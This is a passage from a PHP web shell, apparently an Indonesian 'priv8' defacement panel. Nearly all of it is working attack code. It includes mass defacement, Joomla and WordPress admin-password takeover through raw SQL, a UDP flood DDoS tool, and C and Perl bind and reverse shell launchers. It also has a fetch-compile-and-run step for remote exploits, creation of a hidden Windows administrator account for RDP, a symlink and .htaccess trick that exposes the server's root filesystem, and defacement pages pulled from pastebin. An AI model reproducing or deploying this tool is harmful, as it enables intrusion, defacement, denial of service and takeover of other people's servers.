						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$_GET[i]' style='width: 450px;' height='10' class='w3-input w3-animate-input'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10' class='w3-input w3-animate-input'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width:700px; height:400px;' class='w3-indigo w3-code'>JOYFULL KAWAII TRY TO BE THE BEST ;)</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;' class='w3-btn w3-indigo'>
	</form></center>";
	}
}elseif ($_GET['a']=='jrp') {
	echo "
<div class='w3-container w3-center'>
<h3 class='w3-indigo w3-text-white w3-text-shadow w3-center'>  joomla reset password </h3><br>";
	if(empty($_POST['pwd'])){
echo "<FORM method='POST'><table class='w3-table w3-striped' > <tr class='w3-indigo w3-text-shadow'><th colspan='2'>Connect to mySQL </th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
<input  type='text' name='localhost' value='localhost' class='w3-input' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input  type='text' name='database' value='database' class='w3-input'/></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input type='text' name='username' value='db_user' class='w3-input'/></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input type='password' name='password' value='' class='w3-input'/></td></tr>
<tr><td>&nbsp;&nbsp;new user</td><td>
<input name='admin' value='admin' class='w3-input'/></td></tr>
 <tr><td>&nbsp;&nbsp;new password(12345) </td><td>
<input class='w3-input '  name='pwd' value='e10adc3949ba59abbe56e057f20f883e' disabled></td></tr><tr><td colspan='2'>

<input  type='submit' value='change!' name='send' class='w3-btn w3-indigo w3-btn-block' /></FORM>
</td></tr> </table><br><br><br><br>
";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$hash = crypt($pwd);
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 65") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 65") or die(mysql_error());
if($SQL){
echo "<b>Succesfully! password : 12345";
}
}
}elseif ($_GET['a']=='wprp') {
	echo "
<div class='w3-container w3-center'>
<h3 class='w3-indigo w3-text-shadow w3-text-white'>  wordpress reset password  </h3><br>";
  
  if(empty($_POST['pwd'])){
  
echo "<FORM method='POST'>
<table  class='w3-table w3-striped'> <tr><th colspan='2' class='w3-indigo w3-text-shadow'>Connect to mySQL server</th></tr> <tr><td>&nbsp;&nbsp;Hostname</td><td>
<input class='w3-input' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input class='w3-input' type='text' name='database' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input class='w3-input' type='text' name='username' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input class='w3-input' type='text' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input class='w3-input' class='inputz' type='text' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;Pass Baru</td><td>
<input class='w3-input'  type='text' name='pwd' value='123456' /></td></tr><tr><td colspan='2'>

<input  type='submit' value='change!' name='send' class='w3-btn w3-btn-block w3-indigo' /></FORM>
</td></tr> </table><br><br><br><br>
";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];


 @mysql_connect($localhost,$username,$password) or die(mysql_error());
 @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_email ='".$SQL."' WHERE ID = 1") or die(mysql_error());


if($a4s){
echo "<b> Successfully! password changed!</b> ";
}

}
}elseif ($_GET['a']=='ddos') {
echo"<div class='w3-container w3-center'><h3 class='w3-indigo w3-text-shadow w3-text-white'>DDoS Tools</h3><br><br>";
echo'<table class="w3-table w3-striped"><tr><tr><td>IP Target</td><td>:</td><td><input type="text" class="w3-input" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value==\'\' ) this.value = \'0.0.0.0\';" onfocus = " if ( this.value == \'0.0.0.0\' ) this.value = \'\';"/></td></tr><tr><td>Time</td><td>:</td><td><input type="text" class="w3-input" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value==\'\' ) this.value = \'time (in seconds)\';" onfocus = " if ( this.value == \'time (in seconds)\' ) this.value = \'\';"/>
</td></tr><tr><td>Port</td><td>:</td><td><input type="text" class="w3-input" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value==\'\' ) this.value = \'port\';" onfocus = " if ( this.value == \'port\' ) this.value = \'\';"/></td></tr></tr></table></b><br><input type="submit" class="w3-btn w3-indigo" name="fire" value="  Firee !!!   "></form></div>';
$submit = $_POST['fire'];
if (isset($submit)) {
$packets = 0;
$ip = $_POST['ip'];
$rand = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);
$exec_time = $_POST['time'];
$time = time();
print "Flooded: $ip on port $rand <br><br>";
$max_time = $time+$exec_time;
for($i=0;$i<65535;$i++){
        $out .= "X";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "Packet complete at ".time('h:i:s')." with $packets (" . round(($packets*65)/1024, 2) . " mB) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
}
}elseif ($_GET['a']=='net') {
if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdc.c",$port_bind_bd_c);
 	exe("gcc -o bdc bdc.c");
 	exe("chmod 777 bdc");
 	@unlink("bdc.c");
 	exe("./bdc ".$port." ".$passwrd." &");
 	$scan = exe("ps aux"); 
	if(eregi("./bdc $por",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg =  "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// bind connect with perl
elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdp",$port_bind_bd_pl);
	exe("chmod 777 bdp");
 	$p2=which("perl");
 	exe($p2." bdp ".$port." &");
 	$scan = exe("ps aux"); 
	if(eregi("$p2 bdp $port",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// back connect with c
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcc.c",$back_connect_c);
 	exe("gcc -o bcc bcc.c");
 	exe("chmod 777 bcc");
 	@unlink("bcc.c");
	exe("./bcc ".$ip." ".$port." &");
	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
// back connect with perl
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcp",$back_connect);
	exe("chmod +x bcp");
	$p2=which("perl");
 	exe($p2." bcp ".$ip." ".$port." &");
 	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
{
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$namafile = download($pilihan,$wurl);
	if(is_file($namafile)) {
	
	$msg = exe($wcmd);
	}
	else $msg = "error: file not found $namafile";
}
echo'<div class="w3-container w3-center"><h3 class="w3-indigo w3-text-white w3-text-shadow">NetSploit</h3><table class="w3-table w3-striped w3-center"><tr class="w3-indigo w3-center"><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr><tr><td>';
echo'<table class="w3-table w3-striped"><form method="post" ><tr><td>Port</td><td><input class="w3-input" type="text" name="port" size="26" value="'.$bindport.'"></td></tr><tr><td>Password</td><td><input class="w3-input" type="text" name="bind_pass" size="26" value="'.$bindport_pass.'"></td></tr><tr><td>Use</td><td style="text-align:justify"><p><select class="w3-input" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input class="w3-btn w3-indigo" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form></table>';
echo'</td><td>';
echo'<table class="w3-table w3-striped"><form method="post"><tr><td>IP</td><td><input class="w3-input" type="text" name="ip" size="26" value="'.((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")).'"></td></tr><tr><td>Port</td><td><input class="w3-input" type="text" name="backport" size="26" value="'.$bindport.'"></td></tr><tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="w3-input" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><input type="submit" name="backconn" value="Connect" class="w3-btn w3-indigo" style="width:120px"></td></tr></form></table>';
echo'</td><td>';
echo'<table class="w3-table w3-striped"><form method="post" ><tr><td>url</td><td><input class="w3-input" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr><tr><td>cmd</td><td><input class="w3-input" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td></tr><tr><td><select size="1" class="w3-input" name="pilihan"><option value="wwget">wget</option><option value="wlynx">lynx</option><option value="wfread">fread</option><option value="wfetch">fetch</option><option value="wlinks">links</option><option value="wget">GET</option><option value="wcurl">curl</option></select></td><td colspan="2"><input type="submit" name="expcompile"  value="Go" style="width:246px;" class="w3-btn w3-indigo"></td></tr></form></table>';
echo'</td></tr></table><div style="text-align:center;margin:2px;">'.$msg.'</div></div>';
}elseif ($_GET['a']=='zh') {
echo'<div class="w3-container w3-center"><h3 class="w3-indigo w3-text-shadow w3-text-shadow"> Zone-H Mass Notifer </h3>';
echo'<form method="post"><center><input type="text" name="depecer" style="width:500px" placeholder="defacer" class="w3-input"><br><textarea name="url"  placeholder="http://korban.com" style="width:500px;height:300px;" class="w3-indigo w3-code"></textarea><br><input type="submit" name="go" value="submit" class="w3-btn w3-indigo"></form>';
$url = explode("\r\n", $_POST['url']);
$go = $_POST['go'];
function kirim($target,$hacker) {
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_URL, "http://zone-h.org/notify/single");
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, array(
		  	"defacer" => $hacker,
		  	"domain1" => $target,
		  	"hackmode" => "1",
		  	"reason" => "1",
		  	));
	$res = curl_exec($ch);
		  curl_close($ch);
	return preg_match("/<font color=\"indigo\">OK<\/font><\/li>/", $res);
}
if($go) {
	foreach($url as $sites) {
		if(kirim($sites,$_POST['depecer'])) {
			echo "<br>[ OK ] => $sites <br>";
		} else {
			echo "<br>[ ERROR ] => $sites <br>";
		}
	}
}

}elseif ($_GET['a']=='em') {
$e=function_exists('mail');
	if($e){
	echo "<div class='w3-container w3-center'><h3 class='w3-indigo w3-text-shadow w3-text-white'> Email </h3><br>";
	echo"<form method='post' ><table class='w3-table w3-striped'><tr><td>from :</td><td><input type='text' name='from' value='shutdown57@indonesia.go.id' class='w3-input' ></td></tr><tr><td>For:</td><td><input type='text' name='for' value='admin@".$_SERVER['HTTP_HOST']."' class='w3-input'></td></tr><tr><td>Subject:</td><td><input type='text' name='subject' value='patch ur site!' class='w3-input' ></td></tr><tr><td>COntent:</td><td><textarea name='cont' style='width:100%;height:300px' class='w3-indigo w3-code'>please..patch ur face! ur face is bad :p </textarea></td></tr><tr><td colspan='2'><input type='submit' name='sent' value='send!!' class='w3-btn w3-indigo w3-btn-block' ></td></tr></table></form>";
}else{
	echo" mail() function does not exists in this website!";
}
if(isset($_POST['sent'])){
	if(mail($_POST['for'],$_POST['subject'],$_POST['cont'],$_POST['from'])){
		echo "send!!".$_POST['for'];
	}else{
		echo"failed !!!";
	}
}
}elseif ($_GET['a']=='sym') {
	system('ln -s / achan.txt'); 
$hta ="Options Indexes FollowSymLinks\nDirectoryIndex ssssss.htm\nAddType txt .php\nAddHandler txt .php";
$file = fopen(".htaccess","w+"); 
$write = fwrite ($file ,$hta); 
$sym = symlink("/","achan.txt"); 
$rt="<br><a href='achan.txt' TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
touch me senpai..</b></font></a></center>"; 
echo "<center><br><br><b>Done.. !</b><br>".$rt;
}elseif ($_GET['a']=='rdp') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
echo "<div class='w3-container w3-center'><h3 class='w3-indigo w3-center w3-text-shadow w3-text-white'>Remote Desktop Protocol Tools</h3>";
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=indigo>user <font color=indigo>$user</font> already exists</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=indigo>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br>
    			Username: <font color=indigo>$user</font><br>
    			Password: <font color=indigo>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='indigo'>Successfully :D</font><br>";
    			} else {
    				echo "[add user] -> <font color='indigo'>Failed !</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='indigo'>Successfully :D</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='indigo'>Successfully :D</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='indigo'>Successfully :D</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='indigo'>Failed !</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=indigo>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=indigo>already Exists</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=indigo>Not Exists</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user achan");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=indigo>achan</font>] -> ";
					if($cek) {
						echo "<font color=indigo>Successfully :D</font>";
					} else {
						echo "<font color=indigo>Successfully :D</font>";
					}
				} else {
					echo "[INFO] -> <font color=indigo>user <font color=indigo>$user</font> Not Exists</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=indigo>$user</font>] -> ";
					if($cek) {
						echo "<font color=indigo>Successfully :D</font>";
					} else {
						echo "<font color=indigo>Failed :p</font>";
					}
				} else {
					echo "[INFO] -> <font color=indigo>user <font color=indigo>$user</font> not exists</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<table class='w3-table w3-striped'><tr><td>Username:</td><td>
			<input type='text' name='user' placeholder='username' value='achan' class='w3-input' requiindigo></td></tr><tr><td>Password:</td><td>
			<input type='text' name='pass' placeholder='password' value='achan' class='w3-input' requiindigo></td></tr><tr><td colspan='2'>
			<input type='submit' name='create' value='Go!' class='w3-btn w3-btn-block w3-indigo'></td></tr></table>
			</form>
			-- Option --<br>
			<form method='post'>
			<table class='w3-table w3-striped'><tr><td>Username:</td><td>
			<input type='text' name='r_user' placeholder='username' class='w3-input'  requiindigo></td></tr><tr><td>Options:</td><td>
			<select name='opsi' class='w3-input'>
			<option value='1'>Check Username</option>
			<option value='2'>Change Password</option>
			<option value='3'>Delete Username</option>
			</select></td></tr><tr><td colspan='2'>
			<input type='submit' name='s_opsi' value='Go!' class='w3-btn w3-btn-block w3-indigo'></td></tr></table>
			</form>
			";
		}
	}else{
		echo "<div class='w3-indigo w3-panel'><h3>This Tools Just Support in Windows Server.</h3></div>";
	}
	
}elseif ($_GET['a']=='wos') {
	echo "
	<div class='w3-container w3-center'>
	<h3 class='w3-indigo w3-text-white w3-text-shadow w3-center'>WithOutShadow Priv8 Script Deface</h3>
	<form method='post'>filename : <input type='text' name='wos' value='".$_GET['i']."/wos.html' class='w3-input'><input type='submit' value='deface!' class='w3-btn w3-indigo'></form>";
	if(isset($_POST['wos'])){
		$fp=fopen($_POST['wos'],"w");
		$isi=file_get_contents('http://pastebin.com/raw/0Fm2SLTp');
		if(fwrite($fp,$isi)){
			echo "<script>
			alert('defaced!');
			</script>";
		}
		fclose($fp);
	}
}elseif ($_GET['a']=='ps') {
	echo "
	<div class='w3-container w3-center'>
	<h3 class='w3-indigo w3-text-white w3-text-shadow w3-center'>PeSeC Priv8 Script Deface</h3>
	<form method='post'>filename : <input type='text' name='ps' value='".$_GET['i']."/PeSeC.html' class='w3-input'><input type='submit' value='deface!' class='w3-btn w3-indigo'></form>";
	if(isset($_POST['ps'])){
		$fp=fopen($_POST['ps'],"w");
		$isi=file_get_contents('http://pastebin.com/raw/SDHE0W4T');
		if(fwrite($fp,$isi)){
			echo "<script>
			alert('defaced!');
			</script>";
		}
		fclose($fp);
	}
}elseif ($_GET['a']=='fr') {
	ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
			  curl_setopt($ch, CURLOPT_HEADER, 0);
			  curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		foreach($array as $lnk) {
			$lnk = "http://$lnk";
			$lnk = str_replace(",", "", $lnk);
			echo $lnk."\n";
			ob_flush();
			flush();
		}
			  curl_close($ch);
	}
	function cek($url) {
		$ch = curl_init($url);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		$resp = curl_exec($ch);
		return $resp;
	}
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = cek("$url/~$user/$file");
			if(preg_match("/hacked/", $cek)) {
				echo "<center> URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=indigo>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<div class='w3-container w3-center'>
		<h3 class='w3-indigo w3-text-shadow w3-text-white'>Fake Root</h3>
		<small>By : indoXploit </small>
		<form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' class='w3-input'><br>
		User: <br><input type='text' value='$user'  class='w3-input' readonly><br>
		Domain: <br>
		<textarea style='width:70%;height:400px;' name='url' class='w3-indigo w3-code'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan Fake Root!' class='w3-btn w3-indigo '>
		</form>
		</div>";
	}
}elseif ($_GET['a']=='themes') {
	$i=$_GET['i'];
	$c=$_GET['col'];
	if(empty($c)){
		// ini bukan log atau semacamnya kok, ini cuma html doang -_-" kalo gk percaya decode aja.
		// alesan di encode biar waktu ganti tema ini gak ikut ke ganti.
	@eval(base64_decode("ZWNobyAiPGRpdiBjbGFzcz0ndzMtY29udGFpbmVyIHczLWNlbnRlcic+DQoJCTxoMyBjbGFzcz0ndzMtcmVkIHczLXRleHQtc2hhZG93IHczLXRleHQtd2hpdGUnPkdsb2JhbCBDb2xvcjwvaDM+IjsNCgllY2hvJyA8ZGl2IGNsYXNzPSJ3My1kcm9wZG93bi1ob3ZlciI+DQogIDxhIGNsYXNzPSJ3My1yZWQgdzMtYnRuIiBzdHlsZT0id2lkdGg6MzAwcHg7Ij5TRUxFQ1QgVEhFTUVTPC9hPg0KICA8ZGl2IGNsYXNzPSJ3My1kcm9wZG93bi1jb250ZW50IHczLWJvcmRlciIgc3R5bGU9IndpZHRoOjMwMHB4OyI+DQogICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD1yZWQiICBjbGFzcz0idzMtcmVkIj5SRUQ8L2E+DQogICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD1waW5rIiAgY2xhc3M9InczLXBpbmsiPlBJTks8L2E+DQogICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD1vcmFuZ2UiIGNsYXNzPSJ3My1vcmFuZ2UiPk9SQU5HRTwvYT4NCiAgICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD15ZWxsb3ciICBjbGFzcz0idzMteWVsbG93Ij5ZRUxMT1c8L2E+DQogICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD1ncmVlbiIgIGNsYXNzPSJ3My1ncmVlbiI+R1JFRU48L2E+DQogICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD10ZWFsIiBjbGFzcz0idzMtdGVhbCI+VEVBTDwvYT4NCiAgICAgICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD1jeWFuIiAgY2xhc3M9InczLWN5YW4iPkNZQU48L2E+DQogICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD1saW1lIiAgY2xhc3M9InczLWxpbWUiPkxJTUU8L2E+DQogICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD1ibHVlIiBjbGFzcz0idzMtYmx1ZSI+QkxVRTwvYT4NCiAgICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD1pbmRpZ28iICBjbGFzcz0idzMtaW5kaWdvIj5JTkRJR088L2E+DQogICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD1wdXJwbGUiICBjbGFzcz0idzMtcHVycGxlIj5QVVJQTEU8L2E+DQogICAgPGEgaHJlZj0iP2E9dGhlbWVzJmk9Jy4kaS4nJmNvbD1raGFraSIgY2xhc3M9InczLWtoYWtpIj5LSEFLSTwvYT4NCiAgPC9kaXY+DQo8L2Rpdj4gJzs="));
}else{
$fn=str_replace("/","",$_SERVER['SCRIPT_NAME']);
$gc=file_get_contents($fn);
$co=str_replace("indigo",$c,$gc);
$fp=fopen($fn,"w");
if(fwrite($fp, $co)){
	echo "<meta http-equiv='refresh' content=0;url='?'>";
}else{
	echo "gagal";
}
fclose($fp);
}
}elseif ($_GET['a']=='pass') {
function a_gantipass($old,$new){
	$file=str_replace("/","",$_SERVER['SCRIPT_NAME']);
	$getc=file_get_contents($file);
	$pw=str_replace("".$old."","".$new."",$getc);
	$fp=fopen($file,"w");
	return fwrite($fp,$pw);
	fclose($fp);

}
echo "<div class='w3-center w3-container'><h3 class='w3-indigo w3-text-shadow'>Change Password</h3>";
echo "<form method='post'>";
echo "<table class='w3-table w3-border'><tr><td>Old password:</td><td><input type='text' name='op' class='w3-input'></td></tr>";
echo"<tr><td>New password:</td><td><input type='text' name='np' class='w3-input'></td></tr>";
echo"<tr><td colspan='2'><input type='submit' name='sbmt' class='w3-btn w3-btn-block w3-indigo' value='Change'></td></tr></table></form>";
if(isset($_POST['sbmt'])){
	$plama=md5($_POST['op']);
	$pbaru=md5($_POST['np']);
	if(a_gantipass($plama,$pbaru)){
		echo "<script>alert('passwordberhasil di ubah!')</script>";
		return session_destroy();
	}
}
}
}
$end_html_a ="<br><br><br><br>";
$end_html_a.='<footer class="w3-panel w3-indigo w3-text-shadow w3-text-white w3-center" style="font-size:12px;">copyright &copy; '.date('Y').' PeSec Team | PoweRed by : <a href="http://linuxcode.org" target="_blank">LinuxCode.org</a> | Ayana Shahab priv8 shell By : <a href="https://facebook.com/JKT48.co" >shutdown57</a></footer>';
$end_html_a.='</body></html>';
echo $end_html_a;
?>
